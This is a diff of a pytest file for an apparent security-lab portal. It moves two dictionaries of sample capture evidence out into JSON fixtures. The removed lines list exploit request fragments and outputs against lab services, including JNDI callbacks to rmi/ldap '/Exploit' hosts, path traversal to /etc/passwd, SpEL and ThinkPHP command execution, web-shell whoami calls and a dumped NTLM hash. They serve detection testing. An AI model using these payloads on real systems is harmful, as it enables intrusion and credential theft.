@@ -1,5 +1,6 @@
 import json
 from pathlib import Path
+from typing import Any
 
 import pytest
 
@@ -12,121 +13,19 @@ from portal.modules.security.core.capture_recipes import (
 from portal.modules.security.core.exec_chain import SCENARIOS
 from portal.modules.security.core.siem.capture_enrichment import validate_capture_signals
 
-SAMPLE_EVIDENCE = {
-    "vuln_activemq_deserial": "org.springframework.context.support.ClassPathXmlApplicationContext PORTAL_TARGET_POSTCONDITION:activemq-rce:/tmp/activeMQ-RCE-success",
-    "vuln_fastjson_rce": "com.sun.rowset.JdbcRowSetImpl rmi://10.10.11.50:16668/Exploit PORTAL_TARGET_POSTCONDITION:fastjson-rmi-callback",
-    "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit PORTAL_TARGET_POSTCONDITION:weblogic-ldap-callback",
-    "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt PORTAL_TARGET_POSTCONDITION:laravel-rce:/tmp/portal-laravel-proof",
-    "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null) PORTAL_TARGET_POSTCONDITION:wordpress-rce:/tmp/portal-wordpress-proof",
-    "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec uid=33(www-data) gid=33(www-data)",
-    "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom uid=8983(solr) gid=8983(solr)",
-    "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
-    "vuln_tomcat_deploy": "PUT /portal-proof.jsp/ HTTP/1.1 201 GET /portal-proof.jsp HTTP/1.1 uid=0(root) gid=0(root)",
-    "vuln_couchdb_rce": 'PUT /_users/org.couchdb.user:portalproof1 {"roles":["_admin"],"roles":[]} {"ok":true} Authorization: Basic abc GET /_all_dbs ["_users"]',
-    "vuln_elasticsearch_rce": "POST /_search?pretty script_fields Runtime.getRuntime().exec uid=0(root) gid=0(root)",
-    "vuln_redis_unauth": "INFO server redis_version:4.0.14 CONFIG GET dir /data",
-    "vuln_nacos_rce": "User-Agent: Nacos-Server POST /nacos/v1/auth/users username=portalproof1 POST /nacos/v1/auth/users/login username=nacos accessToken=abc",
-    "vuln_gitea_rce": "POST /a/b.git/info/lfs/objects ....../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
-    "vuln_joomla_rce": 'GET /api/index.php/v1/config/application?public=true {"password":"joomla","db":"joomla"}',
-    "vuln_nexus_rce": "GET /%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd root:x:0:0:root:/root:/bin/bash",
-    "vuln_django_sqli": "GET /?date=xxxx%27xxxx HTTP/1.1 ProgrammingError: unterminated quoted string",
-    "vuln_thinkphp_rce": "POST /index.php?s=captcha _method=__construct&filter%5B%5D=system uid=33(www-data) gid=33(www-data)",
-    "vuln_rails_rce": "GET /robots HTTP/1.1 Accept: ../../../../etc/passwd{{ root:x:0:0:root:/root:/bin/bash",
-    "vuln_phpmyadmin_rce": "GET /index.php?target=db_sql.php%253f/../../../../etc/passwd root:x:0:0:root:/root:/bin/bash",
-    "vuln_nginx_lfi": "GET / Range: bytes=-1217,-9223372036854774591 KEY: http://backend/ HTTP/1.1 200 OK Content-Type: text/html",
-    "vuln_zabbix_rce": "GET /jsrpc.php?profileIdx2=updatexml(0,concat(0xa,user()),0) XPATH syntax error: root@localhost",
-    "vuln_spring_actuator": "SUBSCRIBE selector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success') SEND /app/hello PORTAL_TARGET_POSTCONDITION:spring-rce:/tmp/success",
-    "vuln_gitlab_rce": "POST /uploads/user AT&TFORM PORTAL_TARGET_POSTCONDITION:gitlab-rce:/tmp/portal-gitlab-proof",
-    "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService PORTAL_TARGET_POSTCONDITION:dubbo-rce:/tmp/portal-dubbo-proof",
-    "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120} PORTAL_TARGET_POSTCONDITION:shiro-rce:/tmp/portal-shiro-proof",
-    "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes PORTAL_TARGET_POSTCONDITION:jackson-rce:/tmp/prove1.txt",
-    "meta3_ftp_backdoor": "USER vagrant PASS vagrant 230 User logged in.",
-    "meta3_ssh_brute": "vagrant-2008r2\\vagrant",
-    "meta3_winrm_weakpass": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
-    "meta3_smb_exploit": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
-    "meta3_psexec": "[+] Executed command via wmiexec vagrant-2008r2\\vagrant",
-    "meta3_snmp_enum": "public iso.3.6.1.2.1.1.1.0 = STRING: Hardware: Intel64 - Software: Windows Version 6.1 (Build 7601)",
-    "meta3_mysql_exploit": "VERSION() 5.5.20-log Database information_schema mysql wordpress",
-    "meta3_linux_privesc": "[+] Executed command (shell type: powershell) vagrant-2008r2\\vagrant True",
-    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1 Tomcat Web Application Manager nt authority\\system",
-    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami nt authority\\system",
-    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text nt authority\\local service",
-    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1 201 Created nt authority\\local service",
-    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php nt authority\\local service",
-    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!) script_fields Runtime.getRuntime().exec nt authority\\local service",
-    "meta3_iis_http": "PUT portalproof.aspx GET /portalproof.aspx?c=whoami iis apppool\\defaultapppool",
-    "meta3_struts_rce": "DEFAULT_MEMBER_ACCESS ProcessBuilder ognl.OgnlContext nt authority\\system",
-    "kerberoast_to_da": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB EventCode=4662 Properties=Control Access Account=arya.stark EventCode=4698 TaskName=\\PortalProofTask Account=Administrator",
-    "asrep_to_lateral": "EventCode=4768 PreAuthType=0 Account=arya.stark arya.stark ned.stark EventCode=4698 TaskName=\\PortalProofTask",
-    "ad_full_compromise": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB EventCode=4662 Properties=Control Access Account=arya.stark Process lsass.exe was successfully dumped IP 172.17.0.2.41740 > 10.10.11.21.135: Flags [.]",
-    "relay_to_shell": "Authenticating connection from PORTAL.LAB/ADMINISTRATOR@127.0.0.1 against smb://10.10.11.33 SUCCEED [1] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:2111619b60bd5a8936ae1e414649ed57:::",
-    "web_to_root": "Error: Unknown column 'password' in 'order clause' GET /administrator/uploads/8acf41856d3c0a1ac58932f1d1900d70.php?e=id%3b+cat+%2fflag%2froot.txt HTTP/1.1 uid=0(root) gid=0(root) groups=0(root),33(www-data) MBPTL-9{74ac6fef30abfc98e8532548b9742050}",
-    "mbptl_ctf_full_chain": "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1 GET /administrator/uploads/5fe5d2768352f434ae1168a500ff0a75.php?c=id HTTP/1.1 uid=33(www-data) gid=33(www-data) groups=33(www-data) BOF:uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) MBPTL-17{03762a502a18e260a47da040eaae38fa}",
-    "ctf_multi_service": "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1 uid=33(www-data) gid=33(www-data) groups=33(www-data) BOF:uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) MBPTL-17{03762a502a18e260a47da040eaae38fa}",
-    "mission_meta3_recon_exploit": "8282/tcp open  libelle GET /manager/html HTTP/1.1 Tomcat Web Application Manager nt authority\\system",
-    "mission_ad_enumerate_exploit": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB EventCode=4662 Properties=Control Access Account=arya.stark [+] portal.lab\\administrator:LabAdmin1! (Pwn3d!) [+] Executed command via wmiexec",
-    "mission_vulhub_web_exploit": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof",
-    "mission_meta3_lateral_pivot": "8282/tcp open  libelle GET /manager/html HTTP/1.1 Tomcat Web Application Manager nt authority\\system Executed command via wmiexec",
-    "mission_vulhub_multi_target": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt PORTAL_TARGET_POSTCONDITION:mvmt-laravel-rce:/tmp/portal-mvmt-laravel-proof User-Agent: Nacos-Server /nacos/v1/auth/users mvmtproof /nacos/v1/auth/users/login nacos accessToken",
-}
+_REPO_ROOT = Path(__file__).resolve().parents[4]
 
-REQUEST_ONLY_EVIDENCE = {
-    "vuln_activemq_deserial": "org.springframework.context.support.ClassPathXmlApplicationContext",
-    "vuln_fastjson_rce": "com.sun.rowset.JdbcRowSetImpl rmi://10.10.11.50:16668/Exploit",
-    "vuln_weblogic_rce": "ldap://10.10.11.50:16667/Exploit",
-    "vuln_laravel_rce": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt",
-    "vuln_wordpress_rce": "POST /wp-login.php?action=lostpassword Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin} null)",
-    "vuln_drupal_rce": "POST /user/register?x mail%5B%23post_render%5D%5B%5D=exec",
-    "vuln_solr_rce": "POST /solr/demo/config params.resource.loader.enabled POST /solr/demo/select?v.template=custom",
-    "vuln_grafana_lfi": "GET /public/plugins/alertlist/../../../../etc/passwd",
-    "vuln_tomcat_deploy": "PUT /portal-proof.jsp/ HTTP/1.1 201 GET /portal-proof.jsp HTTP/1.1",
-    "vuln_couchdb_rce": 'PUT /_users/org.couchdb.user:portalproof1 {"roles":["_admin"],"roles":[]}',
-    "vuln_elasticsearch_rce": "POST /_search?pretty script_fields Runtime.getRuntime().exec",
-    "vuln_redis_unauth": "INFO server CONFIG GET dir",
-    "vuln_nacos_rce": "User-Agent: Nacos-Server POST /nacos/v1/auth/users username=portalproof1 POST /nacos/v1/auth/users/login username=nacos",
-    "vuln_gitea_rce": "POST /a/b.git/info/lfs/objects ....../../../etc/passwd",
-    "vuln_joomla_rce": "GET /api/index.php/v1/config/application?public=true",
-    "vuln_nexus_rce": "GET /%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd",
-    "vuln_django_sqli": "GET /?date=xxxx%27xxxx HTTP/1.1",
-    "vuln_thinkphp_rce": "POST /index.php?s=captcha _method=__construct&filter%5B%5D=system",
-    "vuln_rails_rce": "GET /robots HTTP/1.1 Accept: ../../../../etc/passwd{{",
-    "vuln_phpmyadmin_rce": "GET /index.php?target=db_sql.php%253f/../../../../etc/passwd",
-    "vuln_nginx_lfi": "GET / Range: bytes=-1217,-9223372036854774591",
-    "vuln_zabbix_rce": "GET /jsrpc.php?profileIdx2=updatexml(0,concat(0xa,user()),0)",
-    "vuln_spring_actuator": "SUBSCRIBE selector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success') SEND /app/hello",
-    "vuln_gitlab_rce": "POST /uploads/user AT&TFORM",
-    "vuln_dubbo_rce": "POST /org.vulhub.api.CalcService",
-    "vuln_shiro_deserial": f"GET / Cookie: rememberMe={'A' * 120}",
-    "vuln_jackson_deserial": "POST /exploit TemplatesImpl transletBytecodes",
-    "meta3_ftp_backdoor": "USER vagrant",
-    "meta3_ssh_brute": "Warning: Permanently added '10.10.11.10' (ECDSA) to the list of known hosts.",
-    "meta3_winrm_weakpass": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
-    "meta3_smb_exploit": "SMB 10.10.11.10 445 VAGRANT-2008R2 signing:False",
-    "meta3_psexec": "vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
-    "meta3_snmp_enum": "Timeout: No Response from 10.10.11.10",
-    "meta3_mysql_exploit": "VERSION() 5.5.20-log",
-    "meta3_linux_privesc": "vagrant-2008r2\\vagrant",
-    "meta3_tomcat_manager": "GET /manager/html HTTP/1.1",
-    "meta3_elasticsearch_rce": "script_fields exp Runtime.getRuntime().exec whoami",
-    "meta3_jenkins_rce": "scriptText script=println whoami.execute().text",
-    "meta3_webdav_upload": "PUT /uploads/portalproof.php HTTP/1.1",
-    "meta3_wordpress_ninja": "Uploading payload to /wordpress/wp-content/uploads/nftmp-abc123.php",
-    "meta3_full_chain": "Elasticsearch REST API 1.1.1 vagrant-2008R2\\vagrant:vagrant (Pwn3d!)",
-    "meta3_iis_http": "PUT portalproof.aspx GET /portalproof.aspx?c=whoami",
-    "meta3_struts_rce": "DEFAULT_MEMBER_ACCESS ProcessBuilder ognl.OgnlContext",
-    "kerberoast_to_da": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB",
-    "asrep_to_lateral": "EventCode=4768 PreAuthType=0 Account=arya.stark",
-    "ad_full_compromise": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB",
-    "relay_to_shell": "Servers started, waiting for connections",
-    "web_to_root": "GET /detail.php?id=1 HTTP/1.1",
-    "mbptl_ctf_full_chain": "GET /detail.php?id=1 HTTP/1.1",
-    "ctf_multi_service": "GET /detail.php?id=1 HTTP/1.1",
-    "mission_meta3_recon_exploit": "8282/tcp open  libelle",
-    "mission_ad_enumerate_exploit": "EventCode=4769 TicketEncryptionType=0x17 ServiceName=svc_backup Account=administrator@PORTAL.LAB",
-    "mission_vulhub_web_exploit": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt",
-    "mission_meta3_lateral_pivot": "8282/tcp open  libelle",
-    "mission_vulhub_multi_target": "POST /_ignition/execute-solution phar:///var/www/storage/logs/laravel.log/test.txt",
-}
+
+def _load_data(name: str) -> Any:
+    """Load a test fixture that was a module-level literal before V1."""
+    path = _REPO_ROOT / "tests" / "data" / f"{name}.json"
+    with path.open(encoding="utf-8") as fh:
+        return json.load(fh)
+
+
+SAMPLE_EVIDENCE = _load_data("security_test_capture_recipes_sample_evidence")
+
+REQUEST_ONLY_EVIDENCE = _load_data("security_test_capture_recipes_request_only_evidence")
 
 
 @pytest.mark.parametrize("scenario", sorted(CAPTURE_RECIPES))
